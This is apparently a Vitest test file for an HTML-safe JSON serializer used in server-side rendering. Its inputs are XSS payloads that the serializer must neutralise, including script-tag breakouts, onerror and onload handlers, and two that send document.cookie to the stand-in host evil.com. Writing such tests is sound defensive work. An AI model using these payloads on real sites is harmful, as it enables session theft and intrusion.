/**
 * Tests for safeJsonStringify — the HTML-safe JSON serializer.
 *
 * This is a security-critical function. It prevents XSS when embedding
 * JSON data inside <script> tags during SSR. Every test here represents
 * a real attack vector that has been exploited in production SSR frameworks.
 */
import { describe, it, expect } from "vitest";
import { safeJsonStringify } from "../packages/vinext/src/server/html.js";

// ---------------------------------------------------------------------------
// Core escaping behavior
// ---------------------------------------------------------------------------

describe("safeJsonStringify", () => {
  describe("basic functionality", () => {
    it("serializes primitives correctly", () => {
      expect(safeJsonStringify("hello")).toBe('"hello"');
      expect(safeJsonStringify(42)).toBe("42");
      expect(safeJsonStringify(true)).toBe("true");
      expect(safeJsonStringify(null)).toBe("null");
    });

    it("serializes objects and arrays", () => {
      const result = safeJsonStringify({ a: 1, b: [2, 3] });
      // Should be valid JSON when unescaped
      expect(JSON.parse(result.replace(/\\u003c/g, "<").replace(/\\u003e/g, ">").replace(/\\u0026/g, "&"))).toEqual({
        a: 1,
        b: [2, 3],
      });
    });

    it("handles empty objects and arrays", () => {
      expect(safeJsonStringify({})).toBe("{}");
      expect(safeJsonStringify([])).toBe("[]");
    });

    it("handles nested structures", () => {
      const data = { user: { name: "test", tags: ["a", "b"] } };
      const result = safeJsonStringify(data);
      // The output should parse back to the same value when we undo the escapes
      const unescaped = result
        .replace(/\\u003c/g, "<")
        .replace(/\\u003e/g, ">")
        .replace(/\\u0026/g, "&");
      expect(JSON.parse(unescaped)).toEqual(data);
    });
  });

  // ---------------------------------------------------------------------------
  // XSS prevention — the reason this function exists
  // ---------------------------------------------------------------------------

  describe("XSS prevention", () => {
    it("escapes </script> — the classic SSR XSS vector", () => {
      const malicious = '</script><script>alert("xss")</script>';
      const result = safeJsonStringify({ content: malicious });

      // Must NOT contain a literal </script> that would close the tag
      expect(result).not.toContain("</script>");
      expect(result).not.toContain("</Script>");

      // Must contain the escaped form
      expect(result).toContain("\\u003c/script\\u003e");
    });

    it("escapes </SCRIPT> (case variations)", () => {
      const payloads = [
        "</SCRIPT>",
        "</Script>",
        "</ScRiPt>",
      ];
      for (const payload of payloads) {
        const result = safeJsonStringify(payload);
        // All < and > should be escaped regardless of case
        expect(result).not.toContain("<");
        expect(result).not.toContain(">");
      }
    });

    it("escapes <!-- HTML comment open", () => {
      const result = safeJsonStringify("<!--");
      expect(result).not.toContain("<!--");
      expect(result).toContain("\\u003c");
    });

    it("escapes --> HTML comment close", () => {
      const result = safeJsonStringify("-->");
      expect(result).not.toContain("-->");
      expect(result).toContain("\\u003e");
    });

    it("escapes < in all positions", () => {
      const result = safeJsonStringify("<img onerror=alert(1)>");
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });

    it("escapes & to prevent entity interpretation in XHTML", () => {
      const result = safeJsonStringify("&lt;script&gt;");
      expect(result).not.toContain("&");
      expect(result).toContain("\\u0026");
    });

    it("escapes U+2028 LINE SEPARATOR", () => {
      const result = safeJsonStringify("before\u2028after");
      expect(result).not.toContain("\u2028");
      expect(result).toContain("\\u2028");
    });

    it("escapes U+2029 PARAGRAPH SEPARATOR", () => {
      const result = safeJsonStringify("before\u2029after");
      expect(result).not.toContain("\u2029");
      expect(result).toContain("\\u2029");
    });
  });

  // ---------------------------------------------------------------------------
  // Real-world attack payloads
  // ---------------------------------------------------------------------------

  describe("real-world attack payloads", () => {
    it("blocks stored XSS via CMS content in pageProps", () => {
      // Simulates a blog post body from a CMS containing an XSS payload
      const pageProps = {
        post: {
          title: "Innocent Post",
          body: 'Check this out!</script><script>document.location="https://evil.com/steal?c="+document.cookie</script>',
        },
      };
      const result = safeJsonStringify({ props: { pageProps } });

      // The script tag must not break out
      expect(result).not.toContain("</script>");

      // Simulating what the browser sees: embed in a script tag
      const scriptContent = `window.__NEXT_DATA__ = ${result}`;
      // The browser should see this as a single script with JSON data,
      // not as multiple script tags
      expect(scriptContent.match(/<\/script/gi)).toBeNull();
    });

    it("blocks SVG-based XSS payload", () => {
      const payload = '<svg onload="alert(1)">';
      const result = safeJsonStringify({ html: payload });
      // The < and > must be escaped so the browser doesn't parse it as HTML
      expect(result).not.toContain("<svg");
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      // The string "onload" is harmless inside a JSON string — it's the
      // angle brackets that make it dangerous
    });

    it("blocks payload with multiple closing tags", () => {
      const payload = '</script></script></script><script>alert(1)//';
      const result = safeJsonStringify(payload);
      expect(result).not.toContain("</script>");
    });

    it("blocks payload attempting Unicode escape bypass", () => {
      // Some attackers try \u003c/script\u003e in the source hoping
      // the JSON serializer will output the raw chars
      const payload = "\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e";
      const result = safeJsonStringify(payload);
      // The literal < and > from the Unicode escapes must be re-escaped
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });

    it("handles null bytes in payloads", () => {
      const payload = "</scr\0ipt>";
      const result = safeJsonStringify(payload);
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });

    it("handles deeply nested XSS payloads", () => {
      const data = {
        a: {
          b: {
            c: {
              d: {
                value: '</script><script>fetch("https://evil.com/"+document.cookie)</script>',
              },
            },
          },
        },
      };
      const result = safeJsonStringify(data);
      expect(result).not.toContain("</script>");
    });

    it("handles array values with XSS payloads", () => {
      const data = {
        items: [
          "safe",
          '</script><script>alert(1)</script>',
          "also safe",
        ],
      };
      const result = safeJsonStringify(data);
      expect(result).not.toContain("</script>");
    });
  });

  // ---------------------------------------------------------------------------
  // Output validity — the escaped JSON must still parse correctly
  // ---------------------------------------------------------------------------

  describe("output is valid JavaScript", () => {
    it("output can be parsed as a JS expression (simulating script tag eval)", () => {
      const data = {
        title: '</script><script>alert("xss")</script>',
        body: "Hello & goodbye <world>",
        special: "Line\u2028break\u2029here",
      };
      const result = safeJsonStringify(data);

      // The output should be valid JavaScript that evaluates to the original data.
      // We use Function() here intentionally in the test to verify the output
      // is valid JS — this is the exact context where it will be used (inside
      // a <script> tag).
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toEqual(data);
    });

    it("round-trips complex data through script tag simulation", () => {
      const data = {
        props: {
          pageProps: {
            users: [
              { name: "Alice <admin>", bio: "I love &amp; code" },
              { name: "Bob</script>", bio: "\u2028\u2029" },
            ],
          },
        },
        page: "/users/[id]",
        query: { id: "123" },
        isFallback: false,
      };
      const result = safeJsonStringify(data);

      // Must be valid JS
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toEqual(data);
    });

    it("preserves all standard JSON data types", () => {
      const data = {
        string: "hello",
        number: 42,
        float: 3.14,
        negative: -1,
        boolTrue: true,
        boolFalse: false,
        nullValue: null,
        array: [1, "two", null, true],
        nested: { a: { b: { c: "deep" } } },
        empty: {},
        emptyArray: [],
        unicode: "\u00e9\u00e8\u00ea", // French accented chars
        emoji: "\uD83D\uDE00", // grinning face
      };
      const result = safeJsonStringify(data);
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toEqual(data);
    });
  });

  // ---------------------------------------------------------------------------
  // Edge cases
  // ---------------------------------------------------------------------------

  describe("edge cases", () => {
    it("handles empty string", () => {
      expect(safeJsonStringify("")).toBe('""');
    });

    it("handles string with only special characters", () => {
      const result = safeJsonStringify("<>&\u2028\u2029");
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
      expect(result).not.toContain("&");
    });

    it("handles very long strings", () => {
      const long = "x".repeat(100000) + "</script>" + "y".repeat(100000);
      const result = safeJsonStringify(long);
      expect(result).not.toContain("</script>");
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toBe(long);
    });

    it("handles strings that look like escape sequences", () => {
      // Input already contains \\u003c — the serializer should not double-escape
      // in a way that changes semantics. The input literal backslash + u003c
      // should remain as-is in the JSON (JSON.stringify already escapes the backslash).
      const input = "already escaped: \\u003c";
      const result = safeJsonStringify(input);
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toBe(input);
    });

    it("does not mangle regular content", () => {
      const data = {
        title: "My Blog Post",
        description: "A normal description with 'quotes' and \"double quotes\"",
        count: 42,
      };
      const result = safeJsonStringify(data);
      // eslint-disable-next-line no-new-func
      const parsed = new Function(`return (${result})`)();
      expect(parsed).toEqual(data);
    });
  });

  // ---------------------------------------------------------------------------
  // Integration: simulating the actual __NEXT_DATA__ embedding pattern
  // ---------------------------------------------------------------------------

  describe("__NEXT_DATA__ embedding simulation", () => {
    it("produces safe output when embedded in a script tag", () => {
      const pageProps = {
        post: {
          title: "How to </script> break things",
          content: '<img src=x onerror="alert(1)">',
          author: "Alice & Bob <team>",
        },
      };

      const nextData = {
        props: { pageProps },
        page: "/posts/[slug]",
        query: { slug: "test" },
        isFallback: false,
      };

      const scriptContent = `<script>window.__NEXT_DATA__ = ${safeJsonStringify(nextData)}</script>`;

      // Count script tags — there should be exactly one open and one close.
      // lgtm[js/bad-tag-filter] — counting tags to verify XSS protection, not filtering HTML
      const openTags = scriptContent.match(/<script>/g);
      const closeTags = scriptContent.match(/<\/script>/g);
      expect(openTags).toHaveLength(1);
      expect(closeTags).toHaveLength(1);
    });

    it("produces safe output for RSC embed data", () => {
      const embedData = {
        rsc: ['chunk with </script> in it', '<script>alert(1)</script>'],
        params: { id: "123" },
      };

      const scriptContent = `<script>self.__VINEXT_RSC__=${safeJsonStringify(embedData)}</script>`;

      // lgtm[js/bad-tag-filter] — counting tags to verify XSS protection, not filtering HTML
      const openTags = scriptContent.match(/<script>/g);
      const closeTags = scriptContent.match(/<\/script>/g);
      expect(openTags).toHaveLength(1);
      expect(closeTags).toHaveLength(1);
    });

    it("locale globals are safe", () => {
      const locale = '</script><script>alert("locale")</script>';
      const locales = ["en", locale, "fr"];

      const script = `<script>window.__VINEXT_LOCALE__=${safeJsonStringify(locale)};window.__VINEXT_LOCALES__=${safeJsonStringify(locales)}</script>`;

      // lgtm[js/bad-tag-filter] — counting tags to verify XSS protection, not filtering HTML
      const openTags = script.match(/<script>/g);
      const closeTags = script.match(/<\/script>/g);
      expect(openTags).toHaveLength(1);
      expect(closeTags).toHaveLength(1);
    });
  });
});
